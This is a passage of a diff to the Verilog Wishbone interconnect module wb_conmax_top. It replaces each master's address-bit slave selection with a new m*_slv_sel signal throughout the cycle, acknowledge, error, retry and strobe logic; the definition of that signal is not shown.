+            m7_s2_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s2_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd2 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6468,7 +6540,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s3_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s3_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd3 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s3_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s3_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd3 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6479,7 +6551,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s4_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s4_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd4 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s4_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s4_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd4 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6490,7 +6562,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s5_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s5_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd5 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s5_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s5_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd5 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6501,7 +6573,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s6_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s6_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd6 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s6_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s6_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd6 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6512,7 +6584,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s7_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s7_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd7 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s7_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s7_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd7 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6523,7 +6595,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s8_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s8_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd8 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s8_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s8_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd8 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6534,7 +6606,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s9_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s9_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd9 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s9_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s9_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd9 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6545,7 +6617,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s10_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s10_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd10 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s10_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s10_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd10 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6556,7 +6628,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s11_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s11_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd11 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s11_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s11_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd11 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6567,7 +6639,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s12_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s12_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd12 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s12_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s12_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd12 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6578,7 +6650,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s13_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s13_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd13 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s13_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s13_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd13 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6589,7 +6661,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s14_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s14_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd14 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s14_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s14_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd14 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6600,12 +6672,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s15_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s15_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd15 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s15_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s15_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd15 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] or  s0_m7_ack_o or  s1_m7_ack_o or  s2_m7_ack_o or  s3_m7_ack_o or  s4_m7_ack_o or  s5_m7_ack_o or  s6_m7_ack_o or  s7_m7_ack_o or  s8_m7_ack_o or  s9_m7_ack_o or  s10_m7_ack_o or  s11_m7_ack_o or  s12_m7_ack_o or  s13_m7_ack_o or  s14_m7_ack_o or  s15_m7_ack_o)
+    always @ (  m7_slv_sel or  s0_m7_ack_o or  s1_m7_ack_o or  s2_m7_ack_o or  s3_m7_ack_o or  s4_m7_ack_o or  s5_m7_ack_o or  s6_m7_ack_o or  s7_m7_ack_o or  s8_m7_ack_o or  s9_m7_ack_o or  s10_m7_ack_o or  s11_m7_ack_o or  s12_m7_ack_o or  s13_m7_ack_o or  s14_m7_ack_o or  s15_m7_ack_o)
     begin
-        case ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] ) 
+        case ( m7_slv_sel ) 
         4'd0:
         begin
             m7_wb_ack_o = s0_m7_ack_o;
@@ -6672,9 +6744,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] or  s0_m7_err_o or  s1_m7_err_o or  s2_m7_err_o or  s3_m7_err_o or  s4_m7_err_o or  s5_m7_err_o or  s6_m7_err_o or  s7_m7_err_o or  s8_m7_err_o or  s9_m7_err_o or  s10_m7_err_o or  s11_m7_err_o or  s12_m7_err_o or  s13_m7_err_o or  s14_m7_err_o or  s15_m7_err_o)
+    always @ (  m7_slv_sel or  s0_m7_err_o or  s1_m7_err_o or  s2_m7_err_o or  s3_m7_err_o or  s4_m7_err_o or  s5_m7_err_o or  s6_m7_err_o or  s7_m7_err_o or  s8_m7_err_o or  s9_m7_err_o or  s10_m7_err_o or  s11_m7_err_o or  s12_m7_err_o or  s13_m7_err_o or  s14_m7_err_o or  s15_m7_err_o)
     begin
-        case ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] ) 
+        case ( m7_slv_sel ) 
         4'd0:
         begin
             m7_wb_err_o = s0_m7_err_o;
@@ -6741,9 +6813,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] or  s0_m7_rty_o or  s1_m7_rty_o or  s2_m7_rty_o or  s3_m7_rty_o or  s4_m7_rty_o or  s5_m7_rty_o or  s6_m7_rty_o or  s7_m7_rty_o or  s8_m7_rty_o or  s9_m7_rty_o or  s10_m7_rty_o or  s11_m7_rty_o or  s12_m7_rty_o or  s13_m7_rty_o or  s14_m7_rty_o or  s15_m7_rty_o)
+    always @ (  m7_slv_sel or  s0_m7_rty_o or  s1_m7_rty_o or  s2_m7_rty_o or  s3_m7_rty_o or  s4_m7_rty_o or  s5_m7_rty_o or  s6_m7_rty_o or  s7_m7_rty_o or  s8_m7_rty_o or  s9_m7_rty_o or  s10_m7_rty_o or  s11_m7_rty_o or  s12_m7_rty_o or  s13_m7_rty_o or  s14_m7_rty_o or  s15_m7_rty_o)
     begin
-        case ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] ) 
+        case ( m7_slv_sel ) 
         4'd0:
         begin
             m7_wb_rty_o = s0_m7_rty_o;
@@ -9706,40 +9778,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s0_pri_sel == 2'd0 ) ) ? ( s0_arb_state ) : ( ( ( ( s0_msel_pri_sel == 2'd0 ) ) ? ( s0_msel_arb0_state ) : ( ( ( ( s0_msel_pri_sel == 2'd1 ) ) ? ( s0_msel_sel1 ) : ( s0_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd0 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd0 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd0 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd0 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd0 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd0 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd0 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd0 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s0_pri_sel == 2'd0 ) ) ? ( s0_arb_state ) : ( ( ( ( s0_msel_pri_sel == 2'd0 ) ) ? ( s0_msel_arb0_state ) : ( ( ( ( s0_msel_pri_sel == 2'd1 ) ) ? ( s0_msel_sel1 ) : ( s0_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd0 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd0 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd0 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd0 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd0 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd0 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd0 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd0 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s0_pri_sel == 2'd0 ) ) ? ( s0_arb_state ) : ( ( ( ( s0_msel_pri_sel == 2'd0 ) ) ? ( s0_msel_arb0_state ) : ( ( ( ( s0_msel_pri_sel == 2'd1 ) ) ? ( s0_msel_sel1 ) : ( s0_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s0_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd0 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m0_slv_sel == 4'd0 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s0_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd0 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m1_slv_sel == 4'd0 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s0_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd0 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m2_slv_sel == 4'd0 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s0_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd0 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m3_slv_sel == 4'd0 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s0_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd0 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m4_slv_sel == 4'd0 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s0_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd0 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m5_slv_sel == 4'd0 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s0_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd0 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m6_slv_sel == 4'd0 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s0_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd0 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s0_wb_stb_o = ( ( ( m7_slv_sel == 4'd0 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -12663,40 +12735,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s1_pri_sel == 2'd0 ) ) ? ( s1_arb_state ) : ( ( ( ( s1_msel_pri_sel == 2'd0 ) ) ? ( s1_msel_arb0_state ) : ( ( ( ( s1_msel_pri_sel == 2'd1 ) ) ? ( s1_msel_sel1 ) : ( s1_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd1 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd1 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd1 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd1 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd1 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd1 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd1 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd1 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s1_pri_sel == 2'd0 ) ) ? ( s1_arb_state ) : ( ( ( ( s1_msel_pri_sel == 2'd0 ) ) ? ( s1_msel_arb0_state ) : ( ( ( ( s1_msel_pri_sel == 2'd1 ) ) ? ( s1_msel_sel1 ) : ( s1_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd1 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd1 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd1 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd1 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd1 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd1 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd1 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd1 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s1_pri_sel == 2'd0 ) ) ? ( s1_arb_state ) : ( ( ( ( s1_msel_pri_sel == 2'd0 ) ) ? ( s1_msel_arb0_state ) : ( ( ( ( s1_msel_pri_sel == 2'd1 ) ) ? ( s1_msel_sel1 ) : ( s1_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s1_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd1 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m0_slv_sel == 4'd1 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s1_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd1 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m1_slv_sel == 4'd1 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s1_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd1 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m2_slv_sel == 4'd1 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s1_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd1 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m3_slv_sel == 4'd1 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s1_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd1 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m4_slv_sel == 4'd1 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s1_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd1 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m5_slv_sel == 4'd1 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s1_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd1 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m6_slv_sel == 4'd1 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s1_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd1 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s1_wb_stb_o = ( ( ( m7_slv_sel == 4'd1 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -15620,40 +15692,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s2_pri_sel == 2'd0 ) ) ? ( s2_arb_state ) : ( ( ( ( s2_msel_pri_sel == 2'd0 ) ) ? ( s2_msel_arb0_state ) : ( ( ( ( s2_msel_pri_sel == 2'd1 ) ) ? ( s2_msel_sel1 ) : ( s2_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd2 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd2 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd2 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd2 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd2 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd2 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd2 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd2 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s2_pri_sel == 2'd0 ) ) ? ( s2_arb_state ) : ( ( ( ( s2_msel_pri_sel == 2'd0 ) ) ? ( s2_msel_arb0_state ) : ( ( ( ( s2_msel_pri_sel == 2'd1 ) ) ? ( s2_msel_sel1 ) : ( s2_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd2 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd2 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd2 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd2 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd2 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd2 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd2 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd2 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s2_pri_sel == 2'd0 ) ) ? ( s2_arb_state ) : ( ( ( ( s2_msel_pri_sel == 2'd0 ) ) ? ( s2_msel_arb0_state ) : ( ( ( ( s2_msel_pri_sel == 2'd1 ) ) ? ( s2_msel_sel1 ) : ( s2_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s2_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd2 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m0_slv_sel == 4'd2 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s2_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd2 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m1_slv_sel == 4'd2 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s2_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd2 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m2_slv_sel == 4'd2 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s2_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd2 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m3_slv_sel == 4'd2 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s2_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd2 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m4_slv_sel == 4'd2 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s2_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd2 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m5_slv_sel == 4'd2 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s2_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd2 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m6_slv_sel == 4'd2 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s2_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd2 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s2_wb_stb_o = ( ( ( m7_slv_sel == 4'd2 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -18577,40 +18649,40 @@ module wb_conmax_top(
         end
         endcase
     end
